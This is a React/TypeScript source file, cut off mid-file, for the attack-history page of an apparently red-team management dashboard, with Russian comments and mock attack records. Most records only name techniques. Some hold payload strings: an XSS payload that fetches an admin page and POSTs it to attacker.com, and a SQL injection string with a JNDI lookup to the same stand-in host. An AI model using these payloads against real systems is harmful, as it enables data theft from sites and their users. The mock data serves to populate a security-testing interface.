"use client";

import React, { useState, useMemo, useCallback } from 'react';
import { useTranslations } from 'next-intl';
import { useRouter } from 'next/navigation';

import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { ScrollArea } from '@/components/ui/scroll-area';
import { Avatar, AvatarFallback } from '@/components/ui/avatar';
import { Checkbox } from '@/components/ui/checkbox';
import { Progress } from '@/components/ui/progress';
import { Textarea } from '@/components/ui/textarea';
import { Label } from '@/components/ui/label';
import { Switch } from '@/components/ui/switch';

import {
    DropdownMenu,
    DropdownMenuContent,
    DropdownMenuItem,
    DropdownMenuLabel,
    DropdownMenuSeparator,
    DropdownMenuTrigger,
    DropdownMenuCheckboxItem,
    DropdownMenuRadioGroup,
    DropdownMenuRadioItem,
    DropdownMenuSub,
    DropdownMenuSubContent,
    DropdownMenuSubTrigger,
} from '@/components/ui/dropdown-menu';

import {
    Table,
    TableBody,
    TableCell,
    TableHead,
    TableHeader,
    TableRow,
} from '@/components/ui/table';

import {
    Dialog,
    DialogContent,
    DialogDescription,
    DialogFooter,
    DialogHeader,
    DialogTitle,
    DialogTrigger,
} from '@/components/ui/dialog';

import {
    Tooltip,
    TooltipContent,
    TooltipProvider,
    TooltipTrigger,
} from '@/components/ui/tooltip';

import {
    AlertDialog,
    AlertDialogAction,
    AlertDialogCancel,
    AlertDialogContent,
    AlertDialogDescription,
    AlertDialogFooter,
    AlertDialogHeader,
    AlertDialogTitle,
    AlertDialogTrigger,
} from '@/components/ui/alert-dialog';

import {
    Popover,
    PopoverContent,
    PopoverTrigger,
} from '@/components/ui/popover';

import {
    Command,
    CommandEmpty,
    CommandGroup,
    CommandInput,
    CommandItem,
    CommandList,
} from '@/components/ui/command';

import {
    AlertTriangle, Shield, Zap, Clock, CheckCircle, XCircle, Pause,
    Play, Search, Filter, MoreHorizontal, Download, Eye, Trash2,
    Calendar, Target, User, Activity, TrendingUp, TrendingDown,
    RotateCcw, StopCircle, FileText, Copy, Edit3, BarChart3,
    PieChart, LineChart, Settings, Plus, Minus, ArrowUp, ArrowDown,
    RefreshCw, Archive, Share, BookOpen, Bookmark, Star, Flag,
    Globe, Database, Wifi, Lock, Brain, Cpu, Network, Code,
    Smartphone, Factory, Coins, Bug, Fingerprint, Key, Server,
    Cloud, Router, Radar, Crosshair, Microscope, HardDrive,
    Monitor, Layers, Radio, ChevronDown, ChevronUp, ExternalLink,
    Mail, MessageSquare, Slack, Webhook, Bell, BellOff, Volume2,
    VolumeX, Maximize2, Minimize2, RotateCcw as Rotate, Shuffle,
    Hash, Tag, MapPin, Clock3, Calendar as CalendarIcon, Filter as FilterIcon,
    SortAsc, SortDesc, Grid, List, Columns, Eye as EyeIcon, EyeOff,
    Pin, PinOff, ThumbsUp, ThumbsDown, MessageCircle, AlertOctagon,
    Lightbulb, Wrench, ShieldCheck, ShieldAlert, ShieldX, Gauge,
    Timer, PlayCircle, PauseCircle, Square, SkipForward,
    SkipBack, Rewind, FastForward, Image, Video, Camera, Mic,
    MicOff, Speaker, Volume, Headphones, Phone, PhoneCall,
    PhoneOff, Video as VideoIcon, VideoOff, ScreenShare, Cast,
    Airplay, Bluetooth, Wifi as WifiIcon, Signal, Battery, Power,
    PowerOff, Zap as ZapIcon, Flashlight, Sun, Moon, CloudRain,
    CloudSnow, Wind, Thermometer, Droplets, Umbrella, Cloudy
} from 'lucide-react';

// Интерфейсы для данных атак
interface AttackHistoryItem {
    id: string;
    name: string;
    description: string;
    target: string;
    targetType: 'web_application' | 'network_service' | 'database' | 'file_system' | 'operating_system' | 'mobile_application' | 'iot_device' | 'cloud_service';
    attackType: 'sql_injection' | 'xss' | 'csrf' | 'buffer_overflow' | 'privilege_escalation' | 'brute_force' | 'dictionary_attack' | 'dos' | 'ddos' | 'man_in_the_middle' | 'phishing' | 'social_engineering' | 'malware_injection' | 'backdoor' | 'custom';
    payload: string;
    executionMode: 'stealth' | 'aggressive' | 'balanced' | 'custom';
    startTime: string;
    endTime?: string;
    duration?: string;
    status: 'completed' | 'failed' | 'running' | 'paused' | 'stopped' | 'scheduled' | 'cancelled' | 'timeout' | 'error';
    successRate: number;
    targetsCompromised: number;
    totalTargets: number;
    evidenceCollected: string[];
    createdBy: string;
    severity: 'critical' | 'high' | 'medium' | 'low' | 'informational';
    tags: string[];
    reportUrl?: string;
    priority: 'urgent' | 'high' | 'normal' | 'low';
    riskScore: number;
    impactScore: number;
    exploitComplexity: 'low' | 'medium' | 'high';
    confidentialityImpact: 'none' | 'partial' | 'complete';
    integrityImpact: 'none' | 'partial' | 'complete';
    availabilityImpact: 'none' | 'partial' | 'complete';
    attackVector: 'network' | 'adjacent' | 'local' | 'physical';
    userInteraction: 'none' | 'required';
    scope: 'unchanged' | 'changed';
    privilegesRequired: 'none' | 'low' | 'high';
    alertsTriggered: number;
    bypassedControls: string[];
    mitigationsFound: string[];
    complianceImpact: string[];
    businessImpact: 'low' | 'medium' | 'high' | 'critical';
    estimatedCost: number;
    remediationTime: string;
    attackChainSteps: number;
    isFavorite: boolean;
    isBookmarked: boolean;
    commentsCount: number;
    likesCount: number;
    sharesCount: number;
    viewsCount: number;
    lastViewed?: string;
    category: 'red_team' | 'blue_team' | 'purple_team' | 'research' | 'training' | 'compliance';
    environment: 'production' | 'staging' | 'development' | 'testing';
    methodology: string[];
    frameworks: string[];
    ttps: string[]; // Tactics, Techniques, and Procedures
    iocs: string[]; // Indicators of Compromise
    mitre_attack: string[];
    kill_chain_phases: string[];
    network_artifacts: string[];
    host_artifacts: string[];
    behavioral_indicators: string[];
    geolocation?: {
        country: string;
        region: string;
        city: string;
        lat: number;
        lng: number;
    };
    weather_conditions?: {
        temperature: number;
        humidity: number;
        conditions: string;
    };
}

interface AttackComment {
    id: string;
    attackId: string;
    author: string;
    content: string;
    createdAt: string;
    replies: AttackComment[];
    likes: number;
    isEdited: boolean;
}

interface AttackAnalytics {
    totalExecutionTime: string;
    averageSuccessRate: number;
    mostCommonAttackType: string;
    mostTargetedService: string;
    peakExecutionHours: number[];
    geographicalDistribution: { [key: string]: number };
    trendsOverTime: { month: string; count: number; successRate: number }[];
    severityDistribution: { [key: string]: number };
    userActivityStats: { [key: string]: number };
    complianceViolations: { framework: string; violations: number }[];
    riskTrends: { date: string; riskScore: number }[];
    attackChainAnalysis: { steps: number; frequency: number }[];
    mitigationEffectiveness: { mitigation: string; successRate: number }[];
}

// Расширенные mock данные истории атак
const attackHistoryData: AttackHistoryItem[] = [
    {
        id: 'attack-001',
        name: 'Advanced SQL Injection Campaign',
        description: 'Multi-stage SQL injection attack targeting customer database with advanced evasion techniques',
        target: 'https://customer-portal.company.com',
        targetType: 'web_application',
        attackType: 'sql_injection',
        payload: "admin' UNION SELECT * FROM (SELECT CONCAT('${jndi:ldap://attacker.com/}')/*",
        executionMode: 'stealth',
        startTime: '2025-08-15T10:30:00Z',
        endTime: '2025-08-15T11:45:00Z',
        duration: '1ч 15мин',
        status: 'completed',
        successRate: 87.5,
        targetsCompromised: 7,
        totalTargets: 8,
        evidenceCollected: ['login_bypass.log', 'database_dump.sql', 'session_tokens.txt', 'network_traffic.pcap'],
        createdBy: 'alex.pentester@company.com',
        severity: 'critical',
        tags: ['OWASP', 'веб-безопасность', 'инъекции', 'database', 'evasion'],
        reportUrl: '/reports/attack-001.pdf',
        priority: 'urgent',
        riskScore: 9.2,
        impactScore: 8.7,
        exploitComplexity: 'medium',
        confidentialityImpact: 'complete',
        integrityImpact: 'complete',
        availabilityImpact: 'partial',
        attackVector: 'network',
        userInteraction: 'none',
        scope: 'changed',
        privilegesRequired: 'none',
        alertsTriggered: 23,
        bypassedControls: ['WAF', 'Rate Limiting', 'Input Validation'],
        mitigationsFound: ['Parameterized Queries', 'Least Privilege DB Access'],
        complianceImpact: ['PCI DSS 6.5.1', 'OWASP Top 10 A03'],
        businessImpact: 'critical',
        estimatedCost: 250000,
        remediationTime: '2-4 weeks',
        attackChainSteps: 5,
        isFavorite: true,
        isBookmarked: true,
        commentsCount: 12,
        likesCount: 8,
        sharesCount: 3,
        viewsCount: 45,
        lastViewed: '2025-08-16T09:30:00Z',
        category: 'red_team',
        environment: 'production',
        methodology: ['OWASP Testing Guide', 'NIST SP 800-115'],
        frameworks: ['MITRE ATT&CK', 'OWASP ASVS'],
        ttps: ['T1190 - Exploit Public-Facing Application', 'T1055 - Process Injection'],
        iocs: ['unusual_query_patterns.txt', 'suspicious_login_attempts.log'],
        mitre_attack: ['TA0001 - Initial Access', 'TA0005 - Defense Evasion'],
        kill_chain_phases: ['Weaponization', 'Delivery', 'Exploitation', 'Actions on Objectives'],
        network_artifacts: ['HTTP POST requests to /login.php', 'Unusual SQL query patterns'],
        host_artifacts: ['Modified session files', 'Unauthorized database connections'],
        behavioral_indicators: ['Multiple failed login attempts', 'Database query anomalies'],
        geolocation: {
            country: 'Russia',
            region: 'Moscow',
            city: 'Moscow',
            lat: 55.7558,
            lng: 37.6176
        },
        weather_conditions: {
            temperature: 15,
            humidity: 65,
            conditions: 'Cloudy'
        }
    },
    {
        id: 'attack-002',
        name: 'Distributed SSH Brute Force',
        description: 'Large-scale distributed brute force attack using compromised IoT botnet',
        target: 'ssh://prod-server-cluster.company.com',
        targetType: 'network_service',
        attackType: 'brute_force',
        payload: 'rockyou.txt + custom_passwords.txt (2M+ combinations)',
        executionMode: 'aggressive',
        startTime: '2025-08-14T22:00:00Z',
        endTime: '2025-08-15T02:30:00Z',
        duration: '4ч 30мин',
        status: 'completed',
        successRate: 12.5,
        targetsCompromised: 3,
        totalTargets: 24,
        evidenceCollected: ['ssh_credentials.txt', 'system_info.log', 'privilege_escalation.sh', 'lateral_movement.log'],
        createdBy: 'maria.redteam@company.com',
        severity: 'high',
        tags: ['брутфорс', 'SSH', 'словарная атака', 'botnet', 'lateral movement'],
        reportUrl: '/reports/attack-002.pdf',
        priority: 'high',
        riskScore: 7.8,
        impactScore: 6.9,
        exploitComplexity: 'low',
        confidentialityImpact: 'complete',
        integrityImpact: 'complete',
        availabilityImpact: 'none',
        attackVector: 'network',
        userInteraction: 'none',
        scope: 'unchanged',
        privilegesRequired: 'none',
        alertsTriggered: 156,
        bypassedControls: ['Fail2ban (partial)', 'Geo-blocking'],
        mitigationsFound: ['SSH Key Authentication', 'Rate Limiting', 'Account Lockout'],
        complianceImpact: ['NIST CSF PR.AC-1', 'ISO 27001 A.9.4.2'],
        businessImpact: 'high',
        estimatedCost: 75000,
        remediationTime: '1-2 weeks',
        attackChainSteps: 3,
        isFavorite: false,
        isBookmarked: true,
        commentsCount: 7,
        likesCount: 15,
        sharesCount: 5,
        viewsCount: 89,
        lastViewed: '2025-08-16T08:15:00Z',
        category: 'red_team',
        environment: 'production',
        methodology: ['PTES', 'NIST SP 800-115'],
        frameworks: ['MITRE ATT&CK', 'NIST Cybersecurity Framework'],
        ttps: ['T1110.001 - Password Guessing', 'T1021.004 - SSH'],
        iocs: ['brute_force_ips.txt', 'failed_login_patterns.log'],
        mitre_attack: ['TA0006 - Credential Access', 'TA0008 - Lateral Movement'],
        kill_chain_phases: ['Reconnaissance', 'Weaponization', 'Delivery', 'Exploitation'],
        network_artifacts: ['SSH connection attempts from multiple IPs', 'High volume authentication requests'],
        host_artifacts: ['Authentication logs', 'Failed login records'],
        behavioral_indicators: ['Unusual login times', 'Geographic anomalies in access patterns'],
        geolocation: {
            country: 'Russia',
            region: 'Saint Petersburg',
            city: 'Saint Petersburg',
            lat: 59.9311,
            lng: 30.3609
        }
    },
    {
        id: 'attack-003',
        name: 'Cross-Site Scripting Exploitation Chain',
        description: 'Multi-vector XSS attack targeting admin panel with session hijacking',
        target: 'https://admin.test-site.com',
        targetType: 'web_application',
        attackType: 'xss',
        payload: '<img src=x onerror="fetch(\'/admin/users\').then(r=>r.text()).then(d=>fetch(\'https://attacker.com/exfil\',{method:\'POST\',body:d}))">',
        executionMode: 'balanced',
        startTime: '2025-08-13T14:15:00Z',
        endTime: '2025-08-13T15:00:00Z',
        duration: '45мин',
        status: 'failed',
        successRate: 25.0,
        targetsCompromised: 1,
        totalTargets: 4,
        evidenceCollected: ['http_requests.log', 'xss_payloads.txt', 'session_tokens.json'],
        createdBy: 'dmitry.security@company.com',
        severity: 'medium',
        tags: ['XSS', 'JavaScript', 'админка', 'session hijacking', 'data exfiltration'],
        reportUrl: '/reports/attack-003.pdf',
        priority: 'normal',
        riskScore: 6.2,
        impactScore: 5.8,
        exploitComplexity: 'medium',
        confidentialityImpact: 'partial',
        integrityImpact: 'partial',
        availabilityImpact: 'none',
        attackVector: 'network',
        userInteraction: 'required',
        scope: 'unchanged',
        privilegesRequired: 'none',
        alertsTriggered: 8,
        bypassedControls: ['Content Security Policy (partial)'],
        mitigationsFound: ['Input Sanitization', 'Output Encoding', 'HttpOnly Cookies'],
        complianceImpact: ['OWASP Top 10 A07'],
        businessImpact: 'medium',
        estimatedCost: 15000,
        remediationTime: '1 week',
        attackChainSteps: 4,
        isFavorite: false,
        isBookmarked: false,
        commentsCount: 3,
        likesCount: 6,
        sharesCount: 1,
        viewsCount: 34,
        category: 'blue_team',
        environment: 'staging',
        methodology: ['OWASP Testing Guide'],
        frameworks: ['OWASP Top 10'],
        ttps: ['T1189 - Drive-by Compromise', 'T1055 - Process Injection'],
        iocs: ['malicious_js_patterns.txt'],
        mitre_attack: ['TA0001 - Initial Access', 'TA0009 - Collection'],
        kill_chain_phases: ['Delivery', 'Exploitation', 'Installation'],
        network_artifacts: ['HTTP requests with embedded JavaScript', 'Suspicious redirect patterns'],
        host_artifacts: ['Browser console logs', 'Modified DOM elements'],
        behavioral_indicators: ['Unusual JavaScript execution patterns', 'Unexpected network requests']
    },
    {
        id: 'attack-004',
        name: 'Advanced Persistent DoS Campaign',
        description: 'Sophisticated multi-vector DDoS attack using advanced evasion techniques',
        target: 'https://api.production.company.com',
        targetType: 'network_service',
        attackType: 'ddos',
        payload: 'Slowloris + HTTP flood + DNS amplification + BGP hijacking',
        executionMode: 'aggressive',
        startTime: '2025-08-16T12:00:00Z',
        status: 'running',
        successRate: 75.0,
        targetsCompromised: 0,
        totalTargets: 1,
        evidenceCollected: ['traffic_logs.pcap', 'ddos_vectors.json', 'network_topology.xml'],
        createdBy: 'anna.loadtest@company.com',
        severity: 'critical',
        tags: ['DoS', 'нагрузочное тестирование', 'API', 'amplification', 'BGP'],
        priority: 'urgent',
        riskScore: 8.9,
        impactScore: 9.1,
        exploitComplexity: 'high',
        confidentialityImpact: 'none',
        integrityImpact: 'none',
        availabilityImpact: 'complete',
        attackVector: 'network',
        userInteraction: 'none',
        scope: 'changed',
        privilegesRequired: 'none',
        alertsTriggered: 342,
        bypassedControls: ['Rate Limiting', 'DDoS Protection (partial)', 'Geo-blocking'],
        mitigationsFound: ['CDN Protection', 'Load Balancing', 'Traffic Shaping'],
        complianceImpact: ['SLA Violations', 'Business Continuity'],
        businessImpact: 'critical',
        estimatedCost: 500000,
        remediationTime: 'immediate',
        attackChainSteps: 6,
        isFavorite: true,
        isBookmarked: true,
        commentsCount: 18,
        likesCount: 3,
        sharesCount: 0,
        viewsCount: 156,
        category: 'red_team',
        environment: 'production',
        methodology: ['NIST SP 800-115', 'Custom Methodology'],
        frameworks: ['MITRE ATT&CK', 'NIST CSF'],
        ttps: ['T1498.001 - DNS Amplification', 'T1499.004 - Application or System Exploitation'],
        iocs: ['ddos_traffic_patterns.pcap', 'amplification_sources.txt'],
        mitre_attack: ['TA0040 - Impact'],
        kill_chain_phases: ['Weaponization', 'Delivery', 'Actions on Objectives'],
        network_artifacts: ['Massive traffic spikes', 'BGP route anomalies', 'DNS query floods'],
        host_artifacts: ['Resource exhaustion logs', 'Connection timeout errors'],
        behavioral_indicators: ['Abnormal traffic patterns', 'Geographic distribution anomalies']
    },
    {
        id: 'attack-005',
        name: 'Social Engineering & Phishing Campaign',
        description: 'Multi-phase social engineering attack with personalized phishing emails',
        target: 'employees@company.com',
        targetType: 'operating_system',
        attackType: 'phishing',
        payload: 'Customized Microsoft 365 login pages + PDF malware + USB drops',
        executionMode: 'stealth',
        startTime: '2025-08-12T09:00:00Z',
        endTime: '2025-08-12T17:00:00Z',
        duration: '8ч 00мин',
        status: 'completed',
        successRate: 23.5,
        targetsCompromised: 12,
        totalTargets: 51,
        evidenceCollected: ['clicked_users.csv', 'credentials_entered.log', 'email_responses.txt', 'usb_payload_logs.txt'],
        createdBy: 'elena.social@company.com',
        severity: 'critical',
        tags: ['фишинг', 'социальная инженерия', 'осведомленность', 'email', 'USB drops'],
        reportUrl: '/reports/attack-005.pdf',
        priority: 'high',
        riskScore: 8.1,
        impactScore: 7.3,
        exploitComplexity: 'low',
        confidentialityImpact: 'complete',
        integrityImpact: 'complete',
        availabilityImpact: 'partial',
        attackVector: 'network',
        userInteraction: 'required',
        scope: 'changed',
        privilegesRequired: 'none',
        alertsTriggered: 67,
        bypassedControls: ['Email Security Gateway (partial)', 'User Training'],
        mitigationsFound: ['Security Awareness Training', 'Email Authentication', '2FA'],
        complianceImpact: ['ISO 27001 A.13.2.1', 'NIST CSF PR.AT-1'],
        businessImpact: 'high',
        estimatedCost: 180000,
        remediationTime: '3-4 weeks',
        attackChainSteps: 7,
        isFavorite: true,
        isBookmarked: true,
        commentsCount: 25,
        likesCount: 22,
        sharesCount: 8,
        viewsCount: 203,
        category: 'purple_team',
        environment: 'production',
        methodology: ['Social Engineering Toolkit', 'NIST SP 800-115'],
        frameworks: ['MITRE ATT&CK', 'OWASP Top 10'],
        ttps: ['T1566.001 - Spearphishing Attachment', 'T1204.002 - Malicious File'],
        iocs: ['phishing_domains.txt', 'malicious_attachments.json'],
        mitre_attack: ['TA0001 - Initial Access', 'TA0002 - Execution'],
        kill_chain_phases: ['Reconnaissance', 'Weaponization', 'Delivery', 'Exploitation', 'Installation'],
        network_artifacts: ['Suspicious email traffic', 'C2 communication patterns'],
        host_artifacts: ['Malware execution traces', 'Modified system files'],
        behavioral_indicators: ['Unusual email opening patterns', 'Credential reuse attempts']
    },
    {
        id: 'attack-006',
        name: 'Buffer Overflow Exploitation Research',
        description: 'Advanced buffer overflow exploitation with ROP chain development',
        target: '10.0.1.50:8080',
        targetType: 'network_service',
        attackType: 'buffer_overflow',
        payload: 'Custom ROP chain + DEP/ASLR bypass + heap spray',
        executionMode: 'custom',
        startTime: '2025-08-15T16:30:00Z',
        status: 'paused',
        successRate: 50.0,
        targetsCompromised: 0,
        totalTargets: 1,
        evidenceCollected: ['memory_dumps.bin', 'crash_logs.txt', 'rop_chain.py', 'exploit_dev.log'],
        createdBy: 'ivan.exploit@company.com',
        severity: 'critical',
        tags: ['переполнение буфера', 'эксплоит', 'legacy', 'ROP', 'DEP bypass'],
        priority: 'normal',
        riskScore: 9.5,
        impactScore: 8.8,
        exploitComplexity: 'high',
        confidentialityImpact: 'complete',
        integrityImpact: 'complete',
        availabilityImpact: 'complete',
        attackVector: 'network',
        userInteraction: 'none',
        scope: 'changed',
        privilegesRequired: 'none',
        alertsTriggered: 15,
        bypassedControls: ['DEP', 'ASLR (partial)'],
        mitigationsFound: ['Stack Canaries', 'Control Flow Integrity'],
        complianceImpact: ['Secure Coding Standards'],
        businessImpact: 'high',
        estimatedCost: 95000,
        remediationTime: '2-3 weeks',
        attackChainSteps: 8,
        isFavorite: true,
        isBookmarked: false,
        commentsCount: 9,
        likesCount: 14,
        sharesCount: 2,
        viewsCount: 67,
        category: 'research',
        environment: 'testing',
        methodology: ['Custom Research Methodology'],
        frameworks: ['CWE', 'CAPEC'],
        ttps: ['T1055 - Process Injection', 'T1203 - Exploitation for Client Execution'],
        iocs: ['buffer_overflow_patterns.txt'],
        mitre_attack: ['TA0002 - Execution', 'TA0005 - Defense Evasion'],
        kill_chain_phases: ['Weaponization', 'Exploitation', 'Installation'],
        network_artifacts: ['Malformed network packets', 'Unusual service responses'],
        host_artifacts: ['Process crashes', 'Memory corruption traces'],
        behavioral_indicators: ['Service instability', 'Unusual memory allocation patterns']
    }
];

// Статистика с расширенной аналитикой
const attackStatistics = {
    total: attackHistoryData.length,
    completed: attackHistoryData.filter(attack => attack.status === 'completed').length,
    running: attackHistoryData.filter(attack => attack.status === 'running').length,
    failed: attackHistoryData.filter(attack => attack.status === 'failed').length,
    paused: attackHistoryData.filter(attack => attack.status === 'paused').length,
    avgSuccessRate: attackHistoryData.reduce((sum, attack) => sum + attack.successRate, 0) / attackHistoryData.length,
    totalTargetsCompromised: attackHistoryData.reduce((sum, attack) => sum + attack.targetsCompromised, 0),
    totalTargets: attackHistoryData.reduce((sum, attack) => sum + attack.totalTargets, 0),
    criticalAttacks: attackHistoryData.filter(attack => attack.severity === 'critical').length,
    highRiskAttacks: attackHistoryData.filter(attack => attack.riskScore >= 8.0).length,
    avgRiskScore: attackHistoryData.reduce((sum, attack) => sum + attack.riskScore, 0) / attackHistoryData.length,
    avgImpactScore: attackHistoryData.reduce((sum, attack) => sum + attack.impactScore, 0) / attackHistoryData.length,
    totalAlerts: attackHistoryData.reduce((sum, attack) => sum + attack.alertsTriggered, 0),
    totalCost: attackHistoryData.reduce((sum, attack) => sum + attack.estimatedCost, 0),
    favoriteCount: attackHistoryData.filter(attack => attack.isFavorite).length,
    bookmarkedCount: attackHistoryData.filter(attack => attack.isBookmarked).length,
    totalViews: attackHistoryData.reduce((sum, attack) => sum + attack.viewsCount, 0),
    totalComments: attackHistoryData.reduce((sum, attack) => sum + attack.commentsCount, 0),
    totalLikes: attackHistoryData.reduce((sum, attack) => sum + attack.likesCount, 0),
    byCategory: {
        red_team: attackHistoryData.filter(a => a.category === 'red_team').length,
        blue_team: attackHistoryData.filter(a => a.category === 'blue_team').length,
        purple_team: attackHistoryData.filter(a => a.category === 'purple_team').length,
        research: attackHistoryData.filter(a => a.category === 'research').length,
        training: attackHistoryData.filter(a => a.category === 'training').length,
        compliance: attackHistoryData.filter(a => a.category === 'compliance').length,
    },
    byEnvironment: {
        production: attackHistoryData.filter(a => a.environment === 'production').length,
        staging: attackHistoryData.filter(a => a.environment === 'staging').length,
        development: attackHistoryData.filter(a => a.environment === 'development').length,
        testing: attackHistoryData.filter(a => a.environment === 'testing').length,
    },
    recentTrends: {
        last24h: attackHistoryData.filter(a => {
            const diff = Date.now() - new Date(a.startTime).getTime();
            return diff <= 24 * 60 * 60 * 1000;
        }).length,
        last7days: attackHistoryData.filter(a => {
            const diff = Date.now() - new Date(a.startTime).getTime();
            return diff <= 7 * 24 * 60 * 60 * 1000;
        }).length,
        last30days: attackHistoryData.filter(a => {
            const diff = Date.now() - new Date(a.startTime).getTime();
            return diff <= 30 * 24 * 60 * 60 * 1000;
        }).length,
    }
};

const AttackHistoryPage = () => {
    const t = useTranslations('AttackBuilder');
    const tCommon = useTranslations('Common');
    const router = useRouter();

    // Основные состояния фильтрации и поиска
    const [searchQuery, setSearchQuery] = useState('');
    const [statusFilter, setStatusFilter] = useState('all');
    const [severityFilter, setSeverityFilter] = useState('all');
    const [attackTypeFilter, setAttackTypeFilter] = useState('all');
    const [categoryFilter, setCategoryFilter] = useState('all');
    const [environmentFilter, setEnvironmentFilter] = useState('all');
    const [priorityFilter, setPriorityFilter] = useState('all');
    const [riskScoreRange, setRiskScoreRange] = useState<[number, number]>([0, 10]);
    const [dateRange, setDateRange] = useState<{ start: string; end: string }>({ start: '', end: '' });
    const [tagsFilter, setTagsFilter] = useState<string[]>([]);

    // Состояния сортировки и отображения
    const [sortBy, setSortBy] = useState('startTime');
    const [sortOrder, setSortOrder] = useState<'asc' | 'desc'>('desc');
    const [viewMode, setViewMode] = useState<'table' | 'cards' | 'timeline'>('table');
    const [selectedAttacks, setSelectedAttacks] = useState<string[]>([]);
    const [showAdvancedFilters, setShowAdvancedFilters] = useState(false);
    const [columnVisibility, setColumnVisibility] = useState({
        status: true,
        severity: true,
        successRate: true,
        targets: true,
        duration: true,
        user: true,
        riskScore: false,
        impactScore: false,
        alertsCount: false,
        cost: false,
    });

    // Состояния для модальных окон и действий
    const [selectedAttack, setSelectedAttack] = useState<AttackHistoryItem | null>(null);
    const [showDetailsDialog, setShowDetailsDialog] = useState(false);
    const [showCompareDialog, setShowCompareDialog] = useState(false);
    const [showBulkActionsDialog, setShowBulkActionsDialog] = useState(false);
    const [showExportDialog, setShowExportDialog] = useState(false);
    const [showAnalyticsDialog, setShowAnalyticsDialog] = useState(false);
    const [showCommentsDialog, setShowCommentsDialog] = useState(false);

    // Состояния для аналитики и расширенной функциональности
    const [analyticsTimeframe, setAnalyticsTimeframe] = useState<'24h' | '7d' | '30d' | '90d'>('30d');
    const [showHeatmap, setShowHeatmap] = useState(false);
    const [autoRefresh, setAutoRefresh] = useState(false);
    const [refreshInterval, setRefreshInterval] = useState(30);

    // Фильтрация и сортировка данных
    const filteredAndSortedAttacks = useMemo(() => {
        let filtered = attackHistoryData.filter(attack => {
            const matchesSearch =
                attack.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
                attack.target.toLowerCase().includes(searchQuery.toLowerCase()) ||
                attack.createdBy.toLowerCase().includes(searchQuery.toLowerCase()) ||
                attack.description.toLowerCase().includes(searchQuery.toLowerCase()) ||
                attack.tags.some(tag => tag.toLowerCase().includes(searchQuery.toLowerCase()));

            const matchesStatus = statusFilter === 'all' || attack.status === statusFilter;
            const matchesSeverity = severityFilter === 'all' || attack.severity === severityFilter;
            const matchesAttackType = attackTypeFilter === 'all' || attack.attackType === attackTypeFilter;
            const matchesCategory = categoryFilter === 'all' || attack.category === categoryFilter;
            const matchesEnvironment = environmentFilter === 'all' || attack.environment === environmentFilter;
            const matchesPriority = priorityFilter === 'all' || attack.priority === priorityFilter;
            const matchesRiskScore = attack.riskScore >= riskScoreRange[0] && attack.riskScore <= riskScoreRange[1];

            const matchesDateRange = !dateRange.start || !dateRange.end ||
                (new Date(attack.startTime) >= new Date(dateRange.start) &&
                    new Date(attack.startTime) <= new Date(dateRange.end));

            const matchesTags = tagsFilter.length === 0 ||
                tagsFilter.every(tag => attack.tags.includes(tag));

            return matchesSearch && matchesStatus && matchesSeverity && matchesAttackType &&
                matchesCategory && matchesEnvironment && matchesPriority && matchesRiskScore &&
                matchesDateRange && matchesTags;
        });

        // Сортировка
        filtered.sort((a, b) => {
            let aValue: any = a[sortBy as keyof AttackHistoryItem];
            let bValue: any = b[sortBy as keyof AttackHistoryItem];

            if (sortBy === 'startTime' || sortBy === 'endTime') {
                aValue = new Date(aValue).getTime();
                bValue = new Date(bValue).getTime();
            }

            if (typeof aValue === 'string') {
                aValue = aValue.toLowerCase();
                bValue = bValue.toLowerCase();
            }

            if (sortOrder === 'asc') {
                return aValue > bValue ? 1 : -1;
            } else {
                return aValue < bValue ? 1 : -1;
            }
        });

        return filtered;
    }, [searchQuery, statusFilter, severityFilter, attackTypeFilter, categoryFilter,
        environmentFilter, priorityFilter, riskScoreRange, dateRange, tagsFilter, sortBy, sortOrder]);

    // Функции для работы с атаками
    const getStatusIcon = useCallback((status: string) => {
        const iconMap: { [key: string]: React.ReactElement } = {
            completed: <CheckCircle className="w-4 h-4 text-green-600" />,
            running: <Play className="w-4 h-4 text-blue-600" />,
            failed: <XCircle className="w-4 h-4 text-red-600" />,
            paused: <Pause className="w-4 h-4 text-yellow-600" />,
            stopped: <StopCircle className="w-4 h-4 text-gray-600" />,
            scheduled: <Clock className="w-4 h-4 text-purple-600" />,
            cancelled: <XCircle className="w-4 h-4 text-orange-600" />,
            timeout: <Timer className="w-4 h-4 text-red-500" />,
            error: <AlertOctagon className="w-4 h-4 text-red-700" />,
        };
        return iconMap[status] || <AlertTriangle className="w-4 h-4 text-gray-400" />;
    }, []);

    const getStatusColor = useCallback((status: string) => {
        const colorMap: { [key: string]: string } = {
            completed: 'bg-green-100 text-green-800 border-green-300',
            running: 'bg-blue-100 text-blue-800 border-blue-300',
            failed: 'bg-red-100 text-red-800 border-red-300',
            paused: 'bg-yellow-100 text-yellow-800 border-yellow-300',
            stopped: 'bg-gray-100 text-gray-800 border-gray-300',
            scheduled: 'bg-purple-100 text-purple-800 border-purple-300',
            cancelled: 'bg-orange-100 text-orange-800 border-orange-300',
            timeout: 'bg-red-50 text-red-700 border-red-200',
            error: 'bg-red-200 text-red-900 border-red-400',
        };
        return colorMap[status] || 'bg-gray-100 text-gray-800 border-gray-300';
    }, []);

    const getSeverityColor = useCallback((severity: string) => {
        const colorMap: { [key: string]: string } = {
            critical: 'bg-red-600 text-white',
            high: 'bg-orange-600 text-white',
            medium: 'bg-yellow-500 text-black',
            low: 'bg-green-600 text-white',
            informational: 'bg-blue-500 text-white',
        };
        return colorMap[severity] || 'bg-gray-500 text-white';
    }, []);

    const getPriorityColor = useCallback((priority: string) => {
        const colorMap: { [key: string]: string } = {
            urgent: 'bg-red-100 text-red-800 border-red-300',
            high: 'bg-orange-100 text-orange-800 border-orange-300',
            normal: 'bg-blue-100 text-blue-800 border-blue-300',
            low: 'bg-gray-100 text-gray-800 border-gray-300',
        };
        return colorMap[priority] || 'bg-gray-100 text-gray-800 border-gray-300';
    }, []);

    const formatDate = useCallback((dateString: string) => {
        return new Date(dateString).toLocaleString('ru-RU', {
            year: 'numeric',
            month: 'short',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit'
        });
    }, []);

    const formatCurrency = useCallback((amount: number) => {
        return new Intl.NumberFormat('ru-RU', {
            style: 'currency',
            currency: 'RUB',
            minimumFractionDigits: 0,
        }).format(amount);
    }, []);

    // Функции действий
